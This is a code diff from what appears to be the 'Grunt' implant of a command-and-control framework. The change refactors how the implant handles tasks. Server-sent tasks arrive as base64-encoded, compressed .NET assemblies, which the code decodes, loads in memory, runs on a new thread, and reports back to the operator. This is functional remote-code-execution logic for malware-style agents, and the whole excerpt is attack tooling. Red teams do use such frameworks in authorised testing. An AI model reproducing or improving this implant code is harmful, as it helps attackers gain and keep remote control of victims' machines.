@@ -88,12 +88,7 @@ namespace Grunt
                     messenger.WriteTaskingMessage("");
                 }
                 catch (Exception) {}
-                TaskHandler taskSender = new TaskHandler();
-                EventHandler<TaskCompletedArgs> taskHandler = (sender, eventArgs) =>
-                {
-                    messenger.WriteTaskingMessage(eventArgs.output, eventArgs.message.name);
-                };
-                taskSender.TaskCompleted += taskHandler;
+
                 Random rnd = new Random();
                 int ConnectAttemptCount = 0;
                 bool alive = true;
@@ -117,18 +112,24 @@ namespace Grunt
                                     byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                                     byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                                     Assembly gruntTask = Assembly.Load(decompressedBytes);
-                                    // new Thread(() => taskSender.ExecuteTask(gruntTask, parameters, message)).Start();
-                                    string output = "";
-                                    try
+
+                                    new Thread(() =>
                                     {
-                                        var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
-                                        if (results != null) { output = (string)results; }
-                                        messenger.WriteTaskingMessage(output, message.name);
-                                    }
-                                    catch (Exception e)
-                                    {
-                                        messenger.WriteTaskingMessage("TaskHandler Exception: " + e.Message + "\n" + e.StackTrace, message.name);
-                                    }
+                                        string output = "";
+                                        try
+                                        {
+                                            var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
+                                            if (results != null) { output = (string)results; }
+                                        }
+                                        catch (Exception e)
+                                        {
+                                            output += "TaskHandler Exception: " + e.Message + Environment.NewLine + e.StackTrace;
+                                        }
+                                        finally
+                                        {
+                                            messenger.WriteTaskingMessage(output, message.name);
+                                        }
+                                    }).Start();
                                 }
                             }
                             else if (message.type == GruntTaskingType.Set)
@@ -170,37 +171,6 @@ namespace Grunt
             }
             catch (Exception e) {
                 Console.Error.WriteLine(e.Message); Console.Error.WriteLine(e.StackTrace);
-            }
-        }
-    }
-
-    public class TaskCompletedArgs : EventArgs
-    {
-        public GruntTaskingMessage message { get; }
-        public String output { get; }
-
-        public TaskCompletedArgs(GruntTaskingMessage message, String output)
-        {
-            this.message = message;
-            this.output = output;
-        }
-    }
-
-    public class TaskHandler
-    {
-        public event EventHandler<TaskCompletedArgs> TaskCompleted;
-        public void ExecuteTask(Assembly task, Object[] parameters, GruntTaskingMessage message)
-        {
-            string output = "";
-            try
-            {
-                var results = task.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
-                if (results != null) { output = (string)results; }
-                TaskCompleted?.Invoke(this, new TaskCompletedArgs(message, output));
-            }
-            catch (Exception e)
-            {
-                TaskCompleted?.Invoke(this, new TaskCompletedArgs(message, "TaskHandler Exception: " + e.Message + "\n" + e.StackTrace));
             }
         }
     }
